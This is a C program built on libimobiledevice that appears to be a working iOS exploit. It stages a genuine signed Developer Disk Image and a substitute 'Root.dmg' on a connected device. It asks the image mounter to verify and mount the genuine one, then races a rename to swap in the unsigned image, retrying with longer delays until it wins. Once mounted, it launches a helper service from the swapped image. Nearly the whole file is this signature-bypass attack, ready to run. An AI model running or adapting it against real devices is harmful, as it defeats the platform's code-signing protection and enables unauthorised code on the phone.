#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <assert.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/afc.h>
#include <libimobiledevice/mobile_image_mounter.h>

static char *real_dmg, *real_dmg_signature, *ddi_dmg;
int timesl;

// Taken from
// https://github.com/libimobiledevice/libimobiledevice/blob/00f8e5733f716da8032606566eac7a9e2e49514d/tools/ideviceimagemounter.c#L128-L135
static void print_xml(plist_t node)
{
	char *xml = NULL;
	uint32_t len = 0;
	plist_to_xml(node, &xml, &len);
	if (xml)
		puts(xml);
}

void qwrite(afc_client_t afc, const char *from, const char *to)
{
	printf("Sending %s -> %s... ", from, to);
	uint64_t ref;

	int fd = open(from, O_RDONLY);
	assert(fd != -1);
	size_t size = (size_t) lseek(fd, 0, SEEK_END);
	void *buf = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0);
	assert(buf != MAP_FAILED);

  uint32_t ignored_amount;

	afc_file_open(afc, to, 3, &ref);
	afc_file_write(afc, ref, buf, size, &ignored_amount);
	afc_file_close(afc, ref);
	printf("done.\n");
	close(fd);
}


static void cb(const idevice_event_t *given_event, void *ignored_user_data) {
  idevice_t dev;
  lockdownd_client_t lockdown_client;

  printf("Connecting to device...\n");
  if (given_event->event == IDEVICE_DEVICE_ADD) {
    // Awesome, a device has been connected. Let's connect ourselves.
    printf("Attempting to connect to device with UDID %s\n", given_event->udid);
    assert(!idevice_new(&dev, given_event->udid));
    lockdownd_error_t err = lockdownd_client_new_with_handshake(dev, &lockdown_client, "CopyIt");
    if (err != LOCKDOWN_E_SUCCESS) {
      printf("Failed to talk to lockdown: %d\n", err);
      return;
    }

Retry:	{}
    printf("Starting AFC service...\n");
    lockdownd_service_descriptor_t afc_descriptor = 0;
    assert(!lockdownd_start_service(lockdown_client, "com.apple.afc", &afc_descriptor));
    assert(afc_descriptor);

    afc_client_t afc_client;
    assert(!afc_client_new(dev, afc_descriptor, &afc_client));

    printf("Sending DMGs...\n");
    // Now we create the directory to mount our DMGs.
    assert(!afc_make_directory(afc_client, "PublicStaging"));
    afc_remove_path(afc_client, "PublicStaging/staging.dimage");
    qwrite(afc_client, real_dmg, "PublicStaging/staging.dimage");
    qwrite(afc_client, ddi_dmg, "PublicStaging/ddi.dimage");

    // Ask to start up the image mounting daemon.
    printf("Asking to mount DMGs...\n");

		mobile_image_mounter_client_t mim_client = 0;
		lockdownd_service_descriptor_t mim_descriptor = 0;
		assert(!lockdownd_start_service(lockdown_client, "com.apple.mobile.mobile_image_mounter", &mim_descriptor));
		assert(!mobile_image_mounter_new(dev, mim_descriptor, &mim_client));

		// Get real DMG signature
		int fd = open(real_dmg_signature, O_RDONLY);
		assert(fd != -1);
		uint8_t sig[128];
		assert(read(fd, sig, sizeof(sig)) == sizeof(sig));
		close(fd);

		plist_t mount_result_dict = 0;
		mobile_image_mounter_error_t mim_err = mobile_image_mounter_mount_image(mim_client, "/var/mobile/Media/PublicStaging/staging.dimage", (const char*)sig, sizeof(sig), "Developer", &mount_result_dict);

		// The following is heavily adapted from
		// https://github.com/libimobiledevice/libimobiledevice/blob/00f8e5733f716da8032606566eac7a9e2e49514d/tools/ideviceimagemounter.c#L373-L430
		char *status = NULL;
		if (mim_err == MOBILE_IMAGE_MOUNTER_E_SUCCESS) {
			if (mount_result_dict) {
				plist_t node = plist_dict_get_item(mount_result_dict, "Status");
				if (node) {
					plist_get_string_val(node, &status);
					if (status) {
						if (!strcmp(status, "Complete")) {
							printf("Done.\n");
						} else {
							printf("unexpected status value:\n");
							print_xml(mount_result_dict);
							return;
						}
					} else {
						printf("unexpected result:\n");
						print_xml(mount_result_dict);
						return;
					}
				}
				node = plist_dict_get_item(mount_result_dict, "Error");
				if (node) {
					char *error = NULL;
					plist_get_string_val(node, &error);
					if (error) {
						printf("Error: %s\n", error);
					} else {
						printf("unexpected result:\n");
						print_xml(mount_result_dict);
						return;
					}

				} else {
					print_xml(mount_result_dict);
				}
			}
		} else {
			printf("Failed to mount faux staging image: %d\n", err);
			return;
		}
		mobile_image_mounter_hangup(mim_client);
		mobile_image_mounter_free(mim_client);

    // Wait for lockdownd to handle mounting internally.
    usleep(timesl);

    printf("Switching DMG signatures...\n");
    assert(!afc_rename_path(afc_client, "PublicStaging/ddi.dimage", "PublicStaging/staging.dimage"));

		// At this point, we know it was mounted succesfully.
		if (!strcmp(status, "Complete")) {
		  lockdownd_service_descriptor_t helper_socket = 0;
		  sleep(2);
		  printf("Image mounted, running helper...\n");
		  err = lockdownd_start_service(lockdown_client, "CopyIt", &helper_socket);
			if (err != LOCKDOWN_E_SUCCESS) {
				printf("Failed to start helper service: %d\n", err);
				return;
			}
	    assert(!fcntl(helper_socket, F_SETFL, O_NONBLOCK));
	    assert(!fcntl(0, F_SETFL, O_NONBLOCK));
    } else {
			printf("Failed to inject image, trying again... (if it fails, try a different time), delay ... %dus\n", timesl);
			timesl += 1000;
			goto Retry;
		}
  }
}

int main(int argc, char **argv)
{
	if (argc != 4) {
		fprintf(stderr, "Usage: %s DeveloperDiskImage.dmg DeveloperDiskImage.dmg.signature Root.dmg\n", argv[0]);
		return 1;
	}

	timesl = 209999;

	real_dmg = argv[1];
	real_dmg_signature = argv[2];
	ddi_dmg = argv[3];

  assert(!idevice_event_subscribe(cb, NULL));
  // I guess loop
  while(1) {

  }
	return 0;
}
